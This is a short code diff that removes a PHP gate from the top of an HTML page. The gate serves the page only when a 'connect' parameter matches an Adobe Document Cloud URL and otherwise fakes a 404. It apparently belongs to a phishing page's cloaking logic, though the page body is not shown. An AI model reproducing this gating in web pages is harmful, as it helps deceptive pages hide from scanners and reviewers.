@@ -1,22 +1,3 @@
-<?php
-
-$fuck1 = ('connect');
-$fuck2 = ('https://www.adobe.com/documentcloud/business.html');
-
-
-session_start();
-if (($_SESSION['redirected'] ?? null) !== true) {
-    if ($_GET[$fuck1] === ($fuck2)) {
-        $_SESSION['redirected'] = true;
-        header('Refresh: 0');
-        exit();
-    }
-    else {
-        header('HTTP/1.0 404 Not Found', true, 404);
-        exit();
-    }
-} 
-session_destroy();
 <html>
 <head>
 </head>
@@ -275,4 +256,4 @@ type: 'POST',
 
 </html>
   
-  ?>
+
